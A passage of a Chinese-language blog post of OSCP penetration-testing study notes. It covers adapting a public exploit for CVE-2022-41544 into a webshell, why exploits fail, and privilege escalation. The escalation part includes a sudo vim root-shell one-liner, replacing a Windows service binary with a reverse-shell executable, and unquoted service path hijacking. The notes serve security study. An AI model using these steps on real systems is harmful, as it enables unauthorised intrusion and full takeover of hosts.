+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/r1iqYD4Qkg.png"
+                      alt="image"
+                ></p>
+<p>改成<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/S11EqwVXyx.png"
+                      alt="image"
+                ></p>
+<p>再執行看看<br>result:<br>(+)version 3.3.16 is vulnrable to CVE-2022-41544<br>(-)could not get api key</p>
+<p>再看api_leak()<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/Sk6jqPV7yg.png"
+                      alt="image"
+                ><br>到這個url看看403 forbidden</p>
+<p>只能想辦法去搞到api<br>剛剛dirb掃到的目錄裡面還有一個backups&#x2F;<br>進去看看可以看到backup.zip，抓下來就能找到這個xml，裡面就有我要的apikey</p>
+<p>直接改exploit<br>return {apikey}</p>
+<p>再次執行就可以看到webshell trigged successfully!!</p>
+<p>所以有時候稍微修改exploit就能彈shell，不要太快放棄</p>
+<h4 id="常見的exploit失效原因"><a href="#常見的exploit失效原因" class="headerlink" title="常見的exploit失效原因"></a>常見的exploit失效原因</h4><ul>
+<li>版本錯誤<ul>
+<li>版本欺騙&#x2F;抓不到版號導致不執行</li>
+<li>有人手賤改版號躲scan(改回來就可以了)</li>
+<li>有時候廠商給A客戶和B客戶的版本3.3.1不一樣</li>
+<li><blockquote>
+<p>&#x3D;3.3.15，寫錯其實只能&gt;3.3.15</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>路徑錯誤<ul>
+<li>路徑寫死了</li>
+<li>WAF</li>
+<li>安全措施擋住了</li>
+</ul>
+</li>
+<li>抓取資料有浮動性<ul>
+<li>例如findAll(‘input’)[72]，可能剛下載預設才是第72個</li>
+<li>解決辦法就是開一個buff自己調整，自己調成正確的數字</li>
+<li>看懂PoC</li>
+</ul>
+</li>
+<li>涵蓋描述錯誤<ul>
+<li>PoC是錯的，可能連python都跑不起來</li>
+<li>分析、改寫</li>
+<li>放棄</li>
+</ul>
+</li>
+</ul>
+<h3 id="權限提升"><a href="#權限提升" class="headerlink" title="權限提升"></a>權限提升</h3><h4 id="通常怎麼提權"><a href="#通常怎麼提權" class="headerlink" title="通常怎麼提權"></a>通常怎麼提權</h4><ul>
+<li>設定問題<ul>
+<li>權限沒設好</li>
+</ul>
+</li>
+<li>使用者問題<ul>
+<li>桌面放密碼.txt</li>
+<li>所以密碼都一樣</li>
+</ul>
+</li>
+<li>系統漏洞<ul>
+<li>dirty pipe</li>
+<li>windows永恆之藍</li>
+<li>系統的鍋，只能更新</li>
+</ul>
+</li>
+<li>程式漏洞<ul>
+<li>自己寫的或是買來的產品設計不良</li>
+</ul>
+</li>
+</ul>
+<h4 id="Linux-SUDO"><a href="#Linux-SUDO" class="headerlink" title="Linux SUDO"></a>Linux SUDO</h4><p>sudo用來分權，讓使用者暫時有管理員權限</p>
+<p>sudo提權:到<code>/etc/sudoers</code>設定<br>例如有些人打vim懶的用sudo，或直接設定使用者可以直接sudo vim<br>所以拿到webshell，除了whoami之外，sudo -l也用起來，通常會有一些東西</p>
+<p>有管理員權限的vim可以幹嘛?<br>改shadow的密碼等等的<br>這時候也可以到GTFOBins(提權應用指南)去看一些別人提權後可以做的事</p>
+<p>假設sudo vim，到GTFOB可以看到<code>sudo vim -c &#39;:!/bin/sh&#39;就可以開一個root的shell</code></p>
+<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>windows很多服務都是以最高權限在跑，所以你可以換成你的惡意服務<br>實務上run起來的service會被咬住，這邊可以用move，因為windows的程式被load進去後她看的是file的handler，不看filename<br>move service.exe tmp.exe(把他的名字替換掉)<br>cp reverse-shell.exe service.exe(把你的shell改成她的名字)</p>
+<p>要等他的server整台重開後才能讓service生效彈shell</p>
+<ul>
+<li>Service Unquoted Path</li>
+<li>Windows feature(可能是為了相容DOS)<ul>
+<li>exe可以省略不寫</li>
+<li>沒有用雙引號刮起來，會分段解析</li>
+</ul>
+</li>
+</ul>
+<p>windows會自己找exe跟沒有exe的檔案<br>ex:C:\Program Files (x86)\rilakkuma\rilakkuma 9.9\kuma.exe</p>
+<p>windows的解析是:<br>先找<br>C:\Program.exe<br>好沒有<br>C:\Program Files.exe<br>沒有<br>C:\Program Files (x86)\rilakkuma\rilakkuma.exe<br>沒有<br>C:\Program Files (x86)\rilakkuma\rilakkuma 9.9\kuma.exe<br>找到了</p>
+<p>你不一定可以碰到kuma.exe，但你可以在路徑中塞rilakkuma.exe，就可以在下一次服務跑你的exe</p>
+<p>當紅隊的時候沒有這麼多時間會用<br>Linpeas:全自動提權資料蒐集工具(for linux)<br>Winpeas:一樣(for Windows)<br>OSCP不推薦用，之前有人被判違規<br>打紅隊可以用</p>
+<h4 id="利用弱點服務"><a href="#利用弱點服務" class="headerlink" title="利用弱點服務"></a>利用弱點服務</h4><p>電腦中使用高權限的程式，並且是有缺陷的</p>
+<ul>
+<li>安控元件</li>
+<li>盤點工具</li>
+<li>資料蒐集工具</li>
+<li>管理工具</li>
+<li>奇怪的東西</li>
+</ul>
+<p>ex:127.0.0.1掃到remoting的服務，version是MS .NET Remoting service</p>
+<h4 id="NET-Remoting"><a href="#NET-Remoting" class="headerlink" title=".NET Remoting"></a>.NET Remoting</h4><p>.NET遠端處理是微軟.NET Framework中的網路通訊服務，和XML Web Service不同的是它可以使用SOAP以外的協定去通訊，在伺服器端和使用者端之間所操作的方法近乎相同，所以使用者可以不避考慮使用的協定就可以存取伺服器端開放的元件</p>
+<p>打.NET Remoting就是要把local的function code 打成remote的code</p>
+<ul>
+<li>單程式模式<ul>
+<li>呼叫Library的ReadFile去讀程式</li>
+</ul>
+</li>
+<li>Client&#x2F;Server模式<ul>
+<li>本地端在這個模式下可以透過TCP呼叫遠端的ReadFile去讀遠端的檔案</li>
+</ul>
+</li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> OSCP</li>
+        <li><strong>Author:</strong> Troy</li>
+        <li><strong>Created at
+                :</strong> 2024-12-25 01:46:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-12-25 01:52:56
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://tr0y2ooo.github.io/2024/12/25/OSCP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/OSCP/">#OSCP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Penetration-Testing/">#Penetration Testing</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/AD/">#AD</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/12/25/ROP/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">ROP</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/12/25/Bugku/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Bugku</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">OSCP</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#OSCP%E5%89%8D%E5%B0%8EAD-Security"><span class="nav-text">OSCP前導AD Security</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E9%BA%BC%E6%98%AFAD"><span class="nav-text">什麼是AD?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B6%B2%E5%9F%9F%E4%B8%8B%E7%9A%84%E9%9B%BB%E8%85%A6"><span class="nav-text">網域下的電腦</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A8%99%E5%81%B5%E6%9F%A5"><span class="nav-text">目標偵查</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E9%BB%9E%E5%88%A9%E7%94%A8"><span class="nav-text">弱點利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B0%A1%E5%96%AE%E5%BD%88shell-command"><span class="nav-text">簡單彈shell command</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse-shell%E6%80%8E%E9%BA%BC%E6%8E%A5"><span class="nav-text">Reverse shell怎麼接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%91exploit"><span class="nav-text">跑exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AC%8A%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">權限提升</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Tr0y2ooo</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        21 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
